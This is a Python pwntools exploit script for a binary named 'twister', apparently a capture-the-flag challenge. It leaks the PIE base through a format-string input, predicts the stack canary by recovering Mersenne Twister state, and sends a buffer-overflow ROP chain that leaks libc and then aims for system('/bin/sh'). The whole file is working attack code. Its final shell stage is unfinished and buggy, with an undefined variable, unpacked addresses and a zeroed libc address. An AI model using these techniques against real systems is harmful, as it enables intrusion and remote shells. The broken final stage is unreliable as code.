"""Main exploit script."""

from typing import Any, List

import pwn

# if using the custom impl
from mt19937 import MT19937

# if using the public library
# from mt19937predictor import MT19937Predictor

def start(argv: List[str] | None = None, *a: Any, **kw: Any) -> pwn.tube:
    """Start the exploit."""
    if argv is None:
        argv = []
    if len(argv) == 2 and argv[0].isdigit() and argv[1].isdigit():  # ('server', 'port')
        return pwn.remote(argv[0], argv[1], *a, **kw)
    else:
        return pwn.process([exe] + argv, *a, **kw)


exe = "./twister"
elf = pwn.context.binary = pwn.ELF(exe, checksec=False)
pwn.context.log_level = "warning"

p = start()

##### offsets

# size of the buffer that receives answers to the zetamac stuff
answer_buffer_size = 0xFF

# since answer_buffer isn't a whole multiple of 8, there is 1 extra byte
# between the word containing the canary and the end of the buffer
end_answer_buffer_padding = 0x1

# canary is a uint32_t
buffer_canary_padding = 0x4

# dist between canary and return (TODO)
canary_ret_padding = 0x8

# offset between the leaked stack value (*canary+419) and piebase
base_leaked_stack_offset = 0x157B

# from ropper
pop_rdi_offset = 0x1331

# from binary
got_puts_offset = 0x3f58
puts_offset = 0x1140

# also from binary
start_offset = 0x1958

# symbols in libc (TODO get the version)
libc_puts_offset = 0x80e50
libc_binsh_offset = 0x1d8678
libc_system_offset = 0x50d70

##### leak a value off of the stack and get piebase
##### use gdb to verify that this value is *canary+419, and that its offset
##### from piebase is base_leaked_stack_offset

p.sendlineafter(b"]:", b"c")
p.sendlineafter(b"(y/n) ", b"%x")
p.recvuntil(b"user input: ")

stack_value = p.recvline()[:-1]
piebase = int(stack_value, 16) - base_leaked_stack_offset
elf.address = piebase
print(f"piebase: {hex(piebase)}")

p.sendlineafter(b"please try again:", b"n")

##### get the canary helper. every time we play the game,
##### the canary resets, so we'll have to call this fn.
##### this uses a custom impl but can be done with
##### libraries like MT19937Predictor

def _get_canary() -> int:
    twister_state = []
    p.sendlineafter(b"]:", b"c")
    for _ in range(1000):  # any number of iterations >= 624 works
        p.recvuntil(b"canary_id: ")
        twister_state.append(int(p.recvline()[:-1]))
        p.sendlineafter(b"(y/n) ", b"y")

    p.recvuntil(b"canary_id: ")
    twister_state.append(int(p.recvline()[:-1]))
    p.sendlineafter(b"(y/n) ", b"n")

    predictor = MT19937()
    canary = predictor.predict(twister_state[-624:])

    # (if using library instead)
    # predictor = MT19937Predictor()
    # for state in twister_state:
    #     predictor.setrandbits(state, 32)
    # canary = predictor.getrandbits(32)

    return canary

##### play the game helper

def _play_game(callback):
    p.sendlineafter(b"]:", b"p")
    for i in range(10):
        p.recvuntil(b". ")
        question = p.recvuntil(b":")[:-1].decode("utf-8")
        num1, num2 = map(int, question.split("+"))
        ans = num1 + num2

        encoded_ans = str(ans).encode()

        if i == 9:
            payload = callback(encoded_ans)
            p.sendline(payload)
        else:
            p.sendline(encoded_ans)

##### leak libc

gadget = piebase + pop_rdi_offset
puts_got = piebase + got_puts_offset 
puts_plt = piebase + puts_offset
start_addr = piebase + start_offset
print(f"gadget: {hex(gadget)}")
print(f"puts_got: {hex(puts_got)}")
print(f"puts_plt: {hex(puts_plt)}")
print(f"start_addr: {hex(start_addr)}")

print("elf symbols", elf.symbols)
print("elf.got.puts", hex(elf.symbols.got.puts))
print("elf.plt.puts", hex(elf.symbols.plt.puts))
puts_got = elf.got.puts
puts_plt = elf.plt.puts

canary = _get_canary()
print(f"canary: {hex(canary)}")

def leak_libc_callback(encoded_ans: bytes) -> bytes:
    buffer_to_canary_padding = b"A" * (
        answer_buffer_size
        + end_answer_buffer_padding
        - len(encoded_ans)
        - 1
        + buffer_canary_padding
    )
    canary_bytes = canary.to_bytes(4, byteorder="little")
    payload = (
        encoded_ans
        + b"\x00"
        + buffer_to_canary_padding
        + canary_bytes
        + b"A" * canary_ret_padding
        + gadget.to_bytes(8, byteorder="little")
        + puts_got.to_bytes(8, byteorder="little")
        + puts_plt.to_bytes(8, byteorder="little")
        + start_addr.to_bytes(8, byteorder="little")
    )
    return payload

_play_game(leak_libc_callback)

#### everything below here is not run yet ############################

p.interactive()
p.sendlineafter(b"(y/n) ", b"n")

libc_puts_addr = pwn.unpack(p.recv()[:6].ljust(8, b"\x00"))
print("libc_puts_addr", hex(libc_puts_addr))

p.interactive()
libc_puts_addr = 0x0

#### get the shell

canary = _get_canary()
print(f"canary: {hex(canary)}")

libc_base = libc_puts_addr - libc_puts_offset
binsh = libc_base + libc_binsh_offset
system = libc_base + libc_system_offset
print(f"libc_base: {hex(libc_base)}")
print(f"binsh: {hex(binsh)}")
print(f"system: {hex(system)}")

def get_shell_callback(encoded_ans: bytes) -> bytes:
    buffer_to_canary_padding = b"A" * (
        answer_buffer_size
        + end_answer_buffer_padding
        - len(encoded_ans)
        - 1
        + canary_buffer_padding
    )
    canary_to_ret_padding = b"A" * canary_ret_padding
    canary_bytes = canary.to_bytes(4, byteorder="little")
    payload = (
        encoded_ans
        + b"\x00"
        + buffer_to_canary_padding
        + canary_bytes
        + canary_to_ret_padding
        + gadget
        + binsh
        + system
    )
    return payload

#_play_game(leak_libc_callback)
#p.sendlineafter(b"(y/n) ", b"n")

p.interactive()

